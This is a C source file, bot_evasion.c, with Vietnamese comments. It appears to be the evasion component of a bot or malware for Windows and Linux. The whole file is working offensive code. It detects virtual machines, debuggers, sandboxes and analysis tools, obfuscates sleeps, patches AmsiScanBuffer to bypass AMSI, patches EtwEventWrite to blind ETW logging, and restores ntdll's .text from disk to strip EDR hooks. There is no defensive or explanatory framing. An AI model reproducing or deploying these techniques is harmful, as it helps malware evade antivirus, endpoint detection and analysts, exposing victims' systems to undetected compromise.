/**
 * bot_evasion.c
 * Trien khai cac ham chong phat hien, chong debug, chong sandbox
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <intrin.h>
    #include <winternl.h>
    
    /* Khai bao ngoai cho LdrLoadDll */
    typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
    
    /* Dia chi AmsiScanBuffer trong amsi.dll */
    typedef HRESULT (WINAPI *pAmsiScanBuffer)(void*, void*, void*, void*, void*, void*);
#endif

#include "bot_evasion.h"

/* Danh sach process phan tich/wireshark/debugger can kiem tra */
static const char* TIEN_TRINH_PHAN_TICH[] = {
    "wireshark.exe",
    "fiddler.exe",
    "tcpview.exe",
    "procmon.exe",
    "procexp.exe",
    "processhacker.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "ida.exe",
    "ida64.exe",
    "windbg.exe",
    "immunitydebugger.exe",
    "dumpcap.exe",
    "vmtoolsd.exe",
    "vboxservice.exe",
    "vboxtray.exe",
    "vboxcontrol.exe",
    NULL
};

/* Danh sach file/thu muc ao hoa can kiem tra */
static const char* FILE_AO_HOA[] = {
    "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
    "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe",
    "C:\\Windows\\System32\\drivers\\vmmouse.sys",
    "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
    "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
    "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
    NULL
};

/* MAC OUI prefixes cua cac hang ao hoa */
static const unsigned char VM_MAC_PREFIXES[][3] = {
    {0x00, 0x0C, 0x29}, /* VMware */
    {0x00, 0x50, 0x56}, /* VMware */
    {0x00, 0x05, 0x69}, /* VMware */
    {0x08, 0x00, 0x27}, /* VirtualBox */
    {0x00, 0x16, 0x3E}, /* Xen */
    {0x00, 0x1C, 0x42}, /* Parallels */
    {0x00, 0x03, 0xFF}, /* Microsoft Virtual PC */
};
#define SO_VM_MAC_PREFIXES (sizeof(VM_MAC_PREFIXES) / sizeof(VM_MAC_PREFIXES[0]))

#ifdef _WIN32
/* ==================== WINDOWS EVASION ==================== */

/**
 * Kiem tra moi truong ao qua MAC address
 */
static int kiem_tra_mac_vm(void) {
    IP_ADAPTER_INFO adapter_info[16];
    DWORD buffer_size = sizeof(adapter_info);
    DWORD ret = GetAdaptersInfo(adapter_info, &buffer_size);
    
    if (ret != ERROR_SUCCESS) {
        return 0; /* Khong the kiem tra */
    }
    
    PIP_ADAPTER_INFO adapter = adapter_info;
    while (adapter != NULL) {
        if (adapter->AddressLength >= 3) {
            for (size_t i = 0; i < SO_VM_MAC_PREFIXES; i++) {
                if (memcmp(adapter->Address, VM_MAC_PREFIXES[i], 3) == 0) {
                    return 1; /* Phat hien VM MAC */
                }
            }
        }
        adapter = adapter->Next;
    }
    
    return 0;
}

/**
 * Kiem tra registry key cua VM
 */
static int kiem_tra_registry_vm(void) {
    HKEY hkey;
    /* Kiem tra VMware */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                      "SOFTWARE\\VMware, Inc.\\VMware Tools",
                      0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    
    /* Kiem tra VirtualBox */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                      0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    
    return 0;
}

/**
 * Kiem tra firmware (BIOS) cua VM
 */
static int kiem_tra_firmware_vm(void) {
    /* Kiem tra SMBios */
    unsigned char buffer[4096];
    DWORD buffer_size = sizeof(buffer);
    
    if (GetSystemFirmwareTable('RSMB', 0, buffer, buffer_size) > 0) {
        /* Tim cac chuoi "VMware", "VirtualBox", "Xen", "QEMU" */
        char* search_str = (char*)buffer;
        size_t search_len = buffer_size;
        
        const char* vm_strings[] = {"VMware", "VirtualBox", "Xen", "QEMU", "Bochs", NULL};
        for (int i = 0; vm_strings[i] != NULL; i++) {
            for (size_t j = 0; j < search_len; j++) {
                if (strstr(search_str + j, vm_strings[i]) != NULL) {
                    return 1;
                }
            }
        }
    }
    
    return 0;
}

/**
 * Kiem tra so luong CPU core (VM thuong co it core)
 */
static int kiem_tra_cpu_count(void) {
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    /* VM thuong co <= 2 core, nhung cung co the co nhieu hon */
    if (sys_info.dwNumberOfProcessors <= 1) {
        /* Co the la sandbox co 1 core */
        return 1;
    }
    
    return 0;
}

/**
 * Kiem tra RAM (sandbox thuong co it RAM)
 */
static int kiem_tra_ram_thap(void) {
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    
    /* Sandbox thuong co < 2GB RAM */
    if (mem_status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        return 1;
    }
    
    return 0;
}

/**
 * Kiem tra thoi gian uptime
 */
static int kiem_tra_uptime_ngan(void) {
    ULONGLONG uptime_ms = GetTickCount64();
    /* Sandbox thuong moi khoi dong < 10 phut */
    if (uptime_ms < 10 * 60 * 1000) {
        return 1;
    }
    return 0;
}

/**
 * Kiem tra so file trong thu muc Documents
 */
static int kiem_tra_so_file_it(void) {
    int file_count = 0;
    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    
    /* Lay duong dan Documents */
    char documents[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents) != S_OK) {
        strcpy(documents, "C:\\Users");
    }
    
    snprintf(search_path, sizeof(search_path), "%s\\*", documents);
    
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(find_data.cFileName, ".") != 0 && 
                strcmp(find_data.cFileName, "..") != 0) {
                file_count++;
                if (file_count > 50) break; /* Du file, khong phai sandbox */
            }
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    return (file_count < 10) ? 1 : 0;
}

/* Trien khai cac ham chinh */

int anti_vm(void) {
    int diem = 0;
    
    if (kiem_tra_mac_vm()) diem += 2;
    if (kiem_tra_registry_vm()) diem += 3;
    if (kiem_tra_firmware_vm()) diem += 2;
    
    /* Kiem tra file ao hoa */
    for (int i = 0; FILE_AO_HOA[i] != NULL; i++) {
        if (GetFileAttributesA(FILE_AO_HOA[i]) != INVALID_FILE_ATTRIBUTES) {
            diem += 2;
            break;
        }
    }
    
    return (diem >= 3) ? 1 : 0;
}

int anti_debug(void) {
    /* Kiem tra IsDebuggerPresent */
    if (IsDebuggerPresent()) {
        return 1;
    }
    
    /* Kiem tra PEB.BeingDebugged */
    BOOL being_debugged = FALSE;
    __asm {
        mov eax, fs:[0x30]
        mov al, [eax + 2]
        mov being_debugged, al
    }
    if (being_debugged) {
        return 1;
    }
    
    /* Kiem tra NtGlobalFlag */
    PDWORD nt_global_flag = NULL;
    __asm {
        mov eax, fs:[0x30]
        mov eax, [eax + 0x68]
        mov nt_global_flag, eax
    }
    if (nt_global_flag != NULL && (*nt_global_flag & 0x70)) {
        return 1;
    }
    
    /* Kiem tra process debugger */
    if (kiem_tra_tien_trinh_phan_tich()) {
        return 1;
    }
    
    return 0;
}

int anti_sandbox(void) {
    int diem = 0;
    
    if (kiem_tra_uptime_ngan()) diem += 2;
    if (kiem_tra_cpu_count()) diem += 1;
    if (kiem_tra_ram_thap()) diem += 2;
    if (kiem_tra_so_file_it()) diem += 2;
    
    return (diem >= 4) ? 1 : 0;
}

void sleep_obfuscation(int tong_thoi_gian_ms) {
    /* Chia nho thoi gian ngu va thuc hien tinh toan ao */
    int da_ngu = 0;
    int buoc_ngu = 100 + (rand() % 200); /* 100-300ms moi buoc */
    
    while (da_ngu < tong_thoi_gian_ms) {
        int con_lai = tong_thoi_gian_ms - da_ngu;
        int buoc_hien_tai = (con_lai < buoc_ngu) ? con_lai : buoc_ngu;
        
        /* Tinh toan ao de tranh bi skip sleep */
        volatile int sum = 0;
        for (int i = 0; i < buoc_hien_tai; i++) {
            sum += (i * i) % 1000;
        }
        (void)sum;
        
        Sleep(buoc_hien_tai);
        da_ngu += buoc_hien_tai;
    }
}

/**
 * Bypass AMSI bang cach patch AmsiScanBuffer
 */
void amsi_bypass(void) {
    HMODULE amsi_dll = LoadLibraryA("amsi.dll");
    if (amsi_dll == NULL) return;
    
    pAmsiScanBuffer AmsiScanBuffer = (pAmsiScanBuffer)GetProcAddress(amsi_dll, "AmsiScanBuffer");
    if (AmsiScanBuffer == NULL) {
        FreeLibrary(amsi_dll);
        return;
    }
    
    /* Patch: mov eax, 0x80070057 (E_INVALIDARG); ret */
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    
    DWORD old_protect;
    if (VirtualProtect(AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
        memcpy(AmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(AmsiScanBuffer, sizeof(patch), old_protect, &old_protect);
    }
}

/**
 * Vo hieu hoa ETW
 */
void etw_patch(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) return;
    
    /* Tim EtwEventWrite */
    FARPROC etw_event_write = GetProcAddress(ntdll, "EtwEventWrite");
    if (etw_event_write == NULL) return;
    
    /* Patch: xor eax, eax; ret */
    unsigned char patch[] = {0x33, 0xC0, 0xC3};
    
    DWORD old_protect;
    if (VirtualProtect(etw_event_write, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
        memcpy(etw_event_write, patch, sizeof(patch));
        VirtualProtect(etw_event_write, sizeof(patch), old_protect, &old_protect);
    }
}

/**
 * Nap ban sao sach cua ntdll tu disk de tranh EDR hook
 */
void unhook_ntdll(void) {
    /* Doc ntdll.dll tu disk va nap vao bo nho moi */
    char system_path[MAX_PATH];
    GetSystemDirectoryA(system_path, sizeof(system_path));
    
    char ntdll_path[MAX_PATH];
    snprintf(ntdll_path, sizeof(ntdll_path), "%s\\ntdll.dll", system_path);
    
    HANDLE file = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return;
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        CloseHandle(file);
        return;
    }
    
    HANDLE mapping = CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (mapping == NULL) {
        CloseHandle(file);
        return;
    }
    
    LPVOID mapped_view = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (mapped_view == NULL) {
        CloseHandle(mapping);
        CloseHandle(file);
        return;
    }
    
    /* Phan tich PE header cua ntdll */
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)mapped_view;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((BYTE*)mapped_view + dos_header->e_lfanew);
    
    /* Lay dia chi ntdll trong bo nho */
    HMODULE ntdll_loaded = GetModuleHandleA("ntdll.dll");
    if (ntdll_loaded == NULL) {
        UnmapViewOfFile(mapped_view);
        CloseHandle(mapping);
        CloseHandle(file);
        return;
    }
    
    PIMAGE_DOS_HEADER loaded_dos = (PIMAGE_DOS_HEADER)ntdll_loaded;
    PIMAGE_NT_HEADERS loaded_nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_loaded + loaded_dos->e_lfanew);
    
    /* Copy lai phan .text tu disk */
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt_header);
    IMAGE_SECTION_HEADER* loaded_section = IMAGE_FIRST_SECTION(loaded_nt);
    
    for (WORD i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            DWORD old_protect;
            LPVOID text_addr = (LPVOID)((BYTE*)ntdll_loaded + loaded_section[i].VirtualAddress);
            SIZE_T text_size = loaded_section[i].Misc.VirtualSize;
            
            if (VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                memcpy(text_addr, (BYTE*)mapped_view + section[i].VirtualAddress, text_size);
                VirtualProtect(text_addr, text_size, old_protect, &old_protect);
            }
            break;
        }
    }
    
    UnmapViewOfFile(mapped_view);
    CloseHandle(mapping);
    CloseHandle(file);
}

int kiem_tra_tien_trinh_phan_tich(void) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe32)) {
        do {
            for (int i = 0; TIEN_TRINH_PHAN_TICH[i] != NULL; i++) {
                if (stricmp(pe32.szExeFile, TIEN_TRINH_PHAN_TICH[i]) == 0) {
                    CloseHandle(snapshot);
                    return 1;
                }
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    return 0;
}

int kiem_tra_driver_ao_hoa(void) {
    /* Kiem tra cac driver VMware/VirtualBox */
    const char* drivers[] = {
        "\\\\.\\VBoxGuest",
        "\\\\.\\VBoxMouse",
        "\\\\.\\VBoxMiniRdrDN",
        "\\\\.\\HGFS",
        "\\\\.\\vmci",
        NULL
    };
    
    for (int i = 0; drivers[i] != NULL; i++) {
        HANDLE device = CreateFileA(drivers[i], GENERIC_READ, 
                                     FILE_SHARE_READ | FILE_SHARE_WRITE,
                                     NULL, OPEN_EXISTING, 0, NULL);
        if (device != INVALID_HANDLE_VALUE) {
            CloseHandle(device);
            return 1;
        }
    }
    
    return 0;
}

#else
/* ==================== LINUX/MACOS EVASION ==================== */

int anti_vm(void) {
    int diem = 0;
    
    /* Kiem tra /proc/cpuinfo cho hypervisor */
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (cpuinfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), cpuinfo)) {
            if (strstr(line, "hypervisor") != NULL || 
                strstr(line, "vmware") != NULL ||
                strstr(line, "virtualbox") != NULL ||
                strstr(line, "qemu") != NULL ||
                strstr(line, "xen") != NULL) {
                diem += 3;
                break;
            }
        }
        fclose(cpuinfo);
    }
    
    /* Kiem tra DMI */
    FILE* dmi = fopen("/sys/class/dmi/id/product_name", "r");
    if (dmi != NULL) {
        char product[128];
        if (fgets(product, sizeof(product), dmi)) {
            if (strstr(product, "VMware") || strstr(product, "VirtualBox") ||
                strstr(product, "QEMU") || strstr(product, "KVM")) {
                diem += 3;
            }
        }
        fclose(dmi);
    }
    
    return (diem >= 3) ? 1 : 0;
}

int anti_debug(void) {
    /* Kiem tra /proc/self/status cho TracerPid */
    FILE* status = fopen("/proc/self/status", "r");
    if (status != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), status)) {
            if (strstr(line, "TracerPid:") != NULL) {
                int tracer_pid = 0;
                sscanf(line, "TracerPid:\t%d", &tracer_pid);
                if (tracer_pid != 0) {
                    fclose(status);
                    return 1;
                }
                break;
            }
        }
        fclose(status);
    }
    
    /* Kiem tra ptrace */
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1; /* Da bi debug */
    }
    
    return 0;
}

int anti_sandbox(void) {
    int diem = 0;
    
    /* Kiem tra uptime */
    FILE* uptime_file = fopen("/proc/uptime", "r");
    if (uptime_file != NULL) {
        float uptime_seconds;
        if (fscanf(uptime_file, "%f", &uptime_seconds) == 1) {
            if (uptime_seconds < 600) { /* < 10 phut */
                diem += 2;
            }
        }
        fclose(uptime_file);
    }
    
    /* Kiem tra so file trong home */
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    int file_count = 0;
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "find %s -maxdepth 1 -type f 2>/dev/null | wc -l", home);
    FILE* count = popen(cmd, "r");
    if (count != NULL) {
        fscanf(count, "%d", &file_count);
        pclose(count);
        if (file_count < 10) diem += 2;
    }
    
    return (diem >= 3) ? 1 : 0;
}

void sleep_obfuscation(int tong_thoi_gian_ms) {
    int da_ngu = 0;
    int buoc_ngu = 100000 + (rand() % 200000); /* 100-300ms moi buoc (us) */
    
    while (da_ngu < tong_thoi_gian_ms * 1000) {
        int con_lai = tong_thoi_gian_ms * 1000 - da_ngu;
        int buoc_hien_tai = (con_lai < buoc_ngu) ? con_lai : buoc_ngu;
        
        volatile int sum = 0;
        for (int i = 0; i < buoc_hien_tai / 100; i++) {
            sum += (i * i) % 1000;
        }
        (void)sum;
        
        usleep(buoc_hien_tai);
        da_ngu += buoc_hien_tai;
    }
}

void amsi_bypass(void) {
    /* Khong co AMSI tren Linux */
}

void etw_patch(void) {
    /* Khong co ETW tren Linux */
}

void unhook_ntdll(void) {
    /* Khong can tren Linux */
}

int kiem_tra_tien_trinh_phan_tich(void) {
    const char* cmds[] = {
        "ps aux | grep -E 'wireshark|tcpdump|strace|ltrace|gdb|lldb' | grep -v grep",
        NULL
    };
    
    for (int i = 0; cmds[i] != NULL; i++) {
        FILE* p = popen(cmds[i], "r");
        if (p != NULL) {
            char result[256];
            if (fgets(result, sizeof(result), p) != NULL && strlen(result) > 0) {
                pclose(p);
                return 1;
            }
            pclose(p);
        }
    }
    
    return 0;
}

int kiem_tra_driver_ao_hoa(void) {
    /* Kiem tra kernel modules */
    FILE* modules = fopen("/proc/modules", "r");
    if (modules != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), modules)) {
            if (strstr(line, "vbox") || strstr(line, "vmw") || 
                strstr(line, "vmx") || strstr(line, "kvm")) {
                fclose(modules);
                return 1;
            }
        }
        fclose(modules);
    }
    return 0;
}

#endif /* _WIN32 */